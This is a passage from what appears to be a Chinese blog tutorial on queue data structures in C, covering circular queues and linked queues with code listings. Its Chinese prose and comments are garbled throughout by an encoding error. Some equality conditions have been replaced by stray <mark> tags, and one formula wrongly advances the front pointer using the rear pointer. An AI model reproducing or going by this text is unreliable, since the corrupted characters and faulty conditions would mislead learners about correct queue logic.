class="comment">//å…¥é˜Ÿï¼Œè‹¥é˜Ÿåˆ— Q æœªæ»¡ï¼Œå°† x åŠ å…¥ï¼Œä½¿ä¹‹æˆä¸ºæ–°çš„é˜Ÿå°¾ã€‚</span></span><br><span class="line">DeQueue(*Q,*x)<span class="comment">//å‡ºé˜Ÿï¼Œè‹¥é˜Ÿåˆ— Q éç©ºï¼Œåˆ é™¤é˜Ÿå¤´å…ƒç´ ï¼Œå¹¶ç”¨ x è¿”å›ã€‚</span></span><br><span class="line">GetHead(*Q,*x)<span class="comment">//è¯»é˜Ÿå¤´å…ƒç´ ï¼Œè‹¥é˜Ÿåˆ— Q éç©ºï¼Œåˆ™å°†å¯¹å¤´å…ƒç´ èµ‹å€¼ç»™ xã€‚</span></span><br></pre></td></tr></table></figure><h2 id="322-é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#322-é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ç»“æ„">#</a> 3.2.2ã€é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ç»“æ„ï¼š</h2><h3 id="1-é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨"><a class="markdownIt-Anchor" href="#1-é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨">#</a> 1ã€é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ï¼š</h3><p>â€‹é˜Ÿåˆ—çš„é¡ºåºå®ç°æ˜¯æŒ‡åˆ†é…ä¸€å—è¿ç»­çš„å­˜å‚¨å•ä½å­˜æ”¾é˜Ÿåˆ—çš„å…ƒç´ ï¼Œå¹¶é™„è®¾ä¸¤ä¸ªæŒ‡é’ˆï¼šé˜Ÿå¤´æŒ‡é’ˆ front æŒ‡å‘é˜Ÿå¤´å…ƒç´ ï¼Œé˜Ÿå°¾æŒ‡é’ˆ rear æŒ‡å‘é˜Ÿå°¾å…ƒç´ çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚</p><p>â€‹é˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ç±»å‹å¯æè¿°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];</span><br><span class="line">    <span class="type">int</span> front,rear;</span><br><span class="line">&#125; SqQueue;</span><br></pre></td></tr></table></figure><p>â€‹åˆå§‹æ—¶ï¼šQ.front = Q.rear = 0ã€‚</p><p>â€‹è¿›é˜Ÿæ“ä½œï¼šé˜Ÿä¸æ»¡æ—¶ï¼Œå…ˆé€å€¼åˆ°é˜Ÿå°¾å…ƒç´ ï¼Œå†å°†é˜Ÿå°¾æŒ‡é’ˆåŠ  1ã€‚</p><p>â€‹å‡ºé˜Ÿæ“ä½œï¼šé˜Ÿä¸ç©ºæ—¶ï¼Œå…ˆå–é˜Ÿå¤´å…ƒç´ å€¼ï¼Œå†å°†é˜Ÿå¤´æŒ‡é’ˆåŠ  1.</p><p>â€‹å¦‚ä¸‹å›¾ï¼ˆaï¼‰æ‰€ç¤ºä¸ºåˆ—è¡¨çš„åˆå§‹çŠ¶æ€ï¼Œæœ‰  <code>Q.front==Qrear==0</code>  æˆç«‹ï¼Œè¯¥æ¡ä»¶å¯ä»¥ä½œä¸ºé˜Ÿåˆ—åˆ¤æ–­ç©ºçš„æ¡ä»¶ã€‚ä½†èƒ½å¦ç”¨ Q.rear==MaxSize ä½œä¸ºé˜Ÿåˆ—æ»¡çš„æ¡ä»¶å‘¢ï¼Ÿæ˜¾ç„¶ä¸èƒ½ï¼Œå¦‚å›¾ï¼ˆdï¼‰ï¼Œé˜Ÿåˆ—ä¸­ä»…æœ‰ä¸€ä¸ªå…ƒç´ ï¼Œä½†æ‰”æ»¡è¶³è¯¥æ¡ä»¶ã€‚è¿™æ—¶å…¥é˜Ÿå‡ºç° â€œä¸Šæº¢å‡ºâ€ï¼Œä½†è¿™ç§æº¢å‡ºä¸æ˜¯çœŸæ­£çš„æº¢å‡ºï¼Œåœ¨ data æ•°ç»„ä¸­ä¾ç„¶å­˜åœ¨å¯ä»¥å­˜æ”¾å…ƒç´ çš„ç©ºä½ç½®ï¼Œæ‰€ä»¥æ—¶ä¸€ç§ â€œå‡æº¢å‡ºâ€ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/c906a4afeb404f1aa7fa40e6c3fbcfda.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-å¾ªç¯é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#2-å¾ªç¯é˜Ÿåˆ—">#</a> 2ã€å¾ªç¯é˜Ÿåˆ—ï¼š</h3><p>â€‹å°†é¡ºåºé˜Ÿåˆ—è‡†é€ ä¸ºä¸€ä¸ªç¯çŠ¶çš„ç©ºé—´ï¼Œå³æŠŠå­˜å‚¨é˜Ÿåˆ—å…ƒç´ çš„è¡¨ä»é€»è¾‘ä¸Šè§†ä¸ºä¸€ä¸ªç¯ï¼Œç§°ä¸ºå¾ªç¯é˜Ÿåˆ—ã€‚å½“é˜Ÿé¦–æŒ‡é’ˆ   <code>Q.front=maxSize-1</code>  åï¼Œå†å‰è¿›ä¸€ä¸ªä½ç½®å°±è‡ªåŠ¨åˆ° 0ï¼Œè¿™å¯ä»¥åˆ©ç”¨å–ä½™è¿ç®—ï¼ˆ%ï¼‰æ¥å®ç°ã€‚</p><p>â€‹åˆå§‹æ—¶ï¼šQ.front=Q.rear=0ã€‚</p><p>â€‹é˜Ÿé¦–æŒ‡é’ˆè¿› 1ï¼šQ.front=(Q.rear+1)% MaxSizeã€‚</p><p>â€‹é˜Ÿå°¾æŒ‡é’ˆè¿› 1ï¼šQ.rear=(Q.rear+1)% MaxSizeã€‚</p><p>â€‹é˜Ÿåˆ—é•¿åº¦ï¼š(Q.rear+MaxSize-Q.front)% MaxSizeã€‚</p><p>â€‹å‡ºå…¥é˜Ÿåˆ—æ—¶ï¼šæŒ‡é’ˆéƒ½æŒ‰ç…§é¡ºæ—¶é’ˆæ–¹å‘è¿› 1ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/7f4b487d32bd4cb4a828631df8cffc86.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é˜Ÿç©ºçš„æ¡ä»¶æ˜¯ Q.front<mark>Q.rearã€‚è‹¥å…¥é˜Ÿå…ƒç´ çš„é€Ÿåº¦å¿«äºå‡ºé˜Ÿå…ƒç´ çš„é€Ÿåº¦ï¼Œåˆ™é˜Ÿå°¾æŒ‡é’ˆå¾ˆå¿«ä¼šèµ¶ä¸Šé˜Ÿé¦–æŒ‡é’ˆï¼Œæ­¤æ—¶å¯ä»¥çœ‹å‡ºé˜Ÿæ»¡æ—¶ä¹Ÿæœ‰ Q.front</mark>Q.rearã€‚</p><p>â€‹ä¸ºäº†åŒºåˆ†æ—¶ç©ºé˜Ÿè¿˜æ˜¯é˜Ÿæ»¡çš„æƒ…å†µï¼Œæœ‰ä¸‰ç§å¤„ç†æ–¹å¼ï¼š</p><ol><li><p>ç‰ºç‰²ä¸€ä¸ªå•å…ƒæ¥åŒºåˆ†é˜Ÿç©ºå’Œé˜Ÿæ»¡ï¼Œå…¥é˜Ÿæ—¶å°‘ç”¨ä¸€ä¸ªé˜Ÿåˆ—å•å…ƒï¼Œçº¦å®šä»¥ â€œé˜Ÿå¤´æŒ‡é’ˆåœ¨é˜Ÿå°¾æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªä½ç½®ä½œä¸ºæ»¡é˜Ÿçš„æ ‡å¿—â€ã€‚</p><p>é˜Ÿæ»¡æ¡ä»¶ï¼š(Q.rear+1)% MaxSize==Q.frontã€‚</p><p>é˜Ÿç©ºæ¡ä»¶ï¼šQ.front==Q.rearã€‚</p><p>é˜Ÿåˆ—ä¸­å…ƒç´ ä¸ªæ•°ï¼š(Q.rear-Q.front+MaxSize)% MaxSizeã€‚</p></li><li><p>ç±»å‹ä¸­å¢è®¾è¡¨ç¤ºå…ƒç´ ä¸ªæ•°çš„æ•°æ®å‘˜ã€‚è¿™æ ·ï¼Œé˜Ÿç©ºçš„æ¡ä»¶ä¸º Q.size<mark>0ï¼›é˜Ÿæ»¡çš„æ¡ä»¶ä¸º Q.size</mark>MaxSizeã€‚è¿™ä¸¤ç§æƒ…å†µéƒ½æœ‰ Q.front==Q.rearã€‚</p></li><li><p>ç±»å‹ä¸­å¢è®¾ tag æ•°æ®å‘˜ï¼Œä»¥åŒºåˆ†æ˜¯é˜Ÿæ»¡è¿˜æ˜¯é˜Ÿç©ºã€‚tag ç­‰äº 0 æ—¶ï¼Œè‹¥å› åˆ é™¤å¯¼è‡´ Q.front<mark>Q.rearï¼Œåˆ™ä¸ºç©ºé˜Ÿï¼›tag ç­‰äº 1 æ—¶ï¼Œè‹¥å› æ’å…¥å¯¼è‡´ Q.front</mark>Q.rearï¼Œåˆ™ä¸ºé˜Ÿæ»¡ã€‚</p></li></ol><h3 id="3-å¾ªç¯é˜Ÿåˆ—çš„æ“ä½œ"><a class="markdownIt-Anchor" href="#3-å¾ªç¯é˜Ÿåˆ—çš„æ“ä½œ">#</a> 3ã€å¾ªç¯é˜Ÿåˆ—çš„æ“ä½œï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> front,rear;</span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue *Q)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">isEmpty</span><span class="params">(SqQueue *Q)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> *x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue *Q)</span>&#123;</span><br><span class="line">    Q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">    Q-&gt;front = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­é˜Ÿç©º</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isEmpty</span><span class="params">(SqQueue *Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;rear == Q-&gt;front) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…¥é˜Ÿ</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((Q-&gt;rear + <span class="number">1</span>)%MaxSize==Q-&gt;front) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q-&gt;data[Q-&gt;rear] = x;</span><br><span class="line">    Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>)%MaxSize;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡ºé˜Ÿ</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> *x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;rear == Q-&gt;front) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *x = Q-&gt;data[Q-&gt;front];</span><br><span class="line">    Q-&gt;front = (Q-&gt;front + <span class="number">1</span>)%MaxSize;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="323-é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#323-é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ç»“æ„">#</a> 3.2.3ã€é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ç»“æ„:</h2><h3 id="1-é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨"><a class="markdownIt-Anchor" href="#1-é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨">#</a> 1ã€é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ï¼š</h3><p>â€‹é˜Ÿåˆ—çš„é“¾å¼è¡¨ç¤ºç§°ä¸ºé“¾é˜Ÿåˆ—ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªåŒæ—¶å¸¦æœ‰é˜Ÿå¤´æŒ‡é’ˆå’Œé˜Ÿå°¾æŒ‡é’ˆçš„å•é“¾è¡¨ã€‚å¤´æŒ‡é’ˆæŒ‡å‘é˜Ÿå¤´ç»“ç‚¹ï¼Œå°¾æŒ‡é’ˆæŒ‡å‘é˜Ÿå°¾ç»“ç‚¹ï¼Œå³å•é“¾è¡¨çš„æœ€åä¸€ä¸ªç»“ç‚¹ï¼ˆæ³¨æ„ä¸é¡ºåºå­˜å‚¨çš„ä¸åŒï¼‰ã€‚é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/add14de1f6754d479fda55fbfa6c9819.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ç±»å‹å¯æè¿°ä½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;*LinkQueue;</span><br></pre></td></tr></table></figure><p>â€‹å½“ Q.front<mark>NULL ä¸” Q.rear</mark>NULL æ—¶ï¼Œé“¾å¼é˜Ÿåˆ—ä¸ºç©ºã€‚</p><p>â€‹å‡ºé˜Ÿæ—¶ï¼Œé¦–å…ˆåˆ¤æ–­é˜Ÿæ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™å–å‡ºé˜Ÿå¤´å…ƒç´ ï¼Œå°†å…¶ä»é“¾è¡¨ä¸­æ‘˜é™¤ï¼Œå¹¶è®© Q.front æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹ï¼ˆè‹¥è¯¥ç»“ç‚¹ä¸ºæœ€åä¸€ä¸ªç»“ç‚¹ï¼Œåˆ™ç½® Q.front å’Œ Q.rear éƒ½ä¸º NULLï¼‰ã€‚å…¥é˜Ÿæ—¶ã€‚å»ºç«‹ä¸€ä¸ªæ–°çš„ç»“ç‚¹ï¼Œå°†æ–°ç»“ç‚¹æ’å…¥åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œå¹¶è®© Q.rear æŒ‡å‘è¿™ä¸ªæ–°æ’å…¥çš„ç»“ç‚¹ï¼ˆè‹¥åŸé˜Ÿåˆ—ä¸ºç©ºé˜Ÿï¼Œåˆ™ä»¤ Q.front ä¹ŸæŒ‡å‘è¯¥ç»“ç‚¹ï¼‰ã€‚</p><p>â€‹ä¸éš¾çœ‹å‡ºï¼Œä¸å¸¦å¤´ç³»æ¬¸ä½†çš„é“¾å¼é˜Ÿåˆ—åœ¨æ“ä½œä¸Šå¾€å¾€æ¯”è¾ƒéº»çƒ¦ï¼Œå› æ­¤é€šå¸¸å°†é“¾å¼é˜Ÿåˆ—è®¾è®¡æˆä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œè¿™æ ·æ’å…¥çš„åˆ é™¤æ“ä½œå°±ç»Ÿä¸€äº†ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/44727a7b2f3748e8b6a54c529b02da42.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ç”¨å•é“¾è¡¨è¡¨ç¤ºçš„é“¾å¼é˜Ÿåˆ—ç‰¹åˆ«é€‚åˆäºæ•°æ®å…ƒç´ å˜åŠ¨æ¯”è¾ƒå¤§çš„æƒ…å½¢ï¼Œè€Œä¸”ä¸å­˜åœ¨é˜Ÿåˆ—æ»¡ä¸”äº§ç”Ÿæº¢å‡ºçš„é—®é¢˜ã€‚å¦å¤–ï¼Œå‡å¦‚ç¨‹åºä¸­è¦ä½¿ç”¨å¤šä¸ªé˜Ÿåˆ—ï¼Œä¸å¤šä¸ªæ ˆçš„æƒ…å½¢ä¸€æ ·ï¼Œæœ€å¥½ä½¿ç”¨é“¾è¡¨é˜Ÿåˆ—ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°å­˜å‚¨åˆ†é…ä¸åˆç†å’Œ â€œæº¢å‡ºâ€ çš„é—®é¢˜ã€‚</p><h3 id="2-é“¾å¼é˜Ÿåˆ—çš„åŸºæœ¬æ“ä½œ"><a class="markdownIt-Anchor" href="#2-é“¾å¼é˜Ÿåˆ—çš„åŸºæœ¬æ“ä½œ">#</a> 2ã€é“¾å¼é˜Ÿåˆ—çš„åŸºæœ¬æ“ä½œ</h3><h4 id="1åˆå§‹åŒ–"><a class="markdownIt-Anchor" href="#1åˆå§‹åŒ–">#</a> ï¼ˆ1ï¼‰åˆå§‹åŒ–ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;*LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆå§‹åŒ–é˜Ÿåˆ—çš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    Q-&gt;front = Q-&gt;rear =  (LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));  <span class="comment">//å»ºç«‹å¤´ç»“ç‚¹</span></span><br><span class="line">    Q-&gt;front-&gt;next = <span class="literal">NULL</span>;                                           <span class="comment">//åˆå§‹ä¸ºç©º</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2åˆ¤é˜Ÿç©º"><a class="markdownIt-Anchor" href="#2åˆ¤é˜Ÿç©º">#</a> ï¼ˆ2ï¼‰åˆ¤é˜Ÿç©º</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;*LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆå§‹åŒ–é˜Ÿåˆ—çš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    Q-&gt;front = Q-&gt;rear =  (LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));  <span class="comment">//å»ºç«‹å¤´ç»“ç‚¹</span></span><br><span class="line">    Q-&gt;front-&gt;next = <span class="literal">NULL</span>;                                           <span class="comment">//åˆå§‹ä¸ºç©º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ¤æ–­é˜Ÿç©ºçš„å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3å…¥é˜Ÿ"><a class="markdownIt-Anchor" href="#3å…¥é˜Ÿ">#</a> ï¼ˆ3ï¼‰å…¥é˜Ÿ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;*LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue Q,<span class="type">int</span> x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆå§‹åŒ–é˜Ÿåˆ—çš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    Q-&gt;front = Q-&gt;rear =  (LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));  <span class="comment">//å»ºç«‹å¤´ç»“ç‚¹</span></span><br><span class="line">    Q-&gt;front-&gt;next = <span class="literal">NULL</span>;                                           <span class="comment">//åˆå§‹ä¸ºç©º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ¤æ–­é˜Ÿç©ºçš„å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 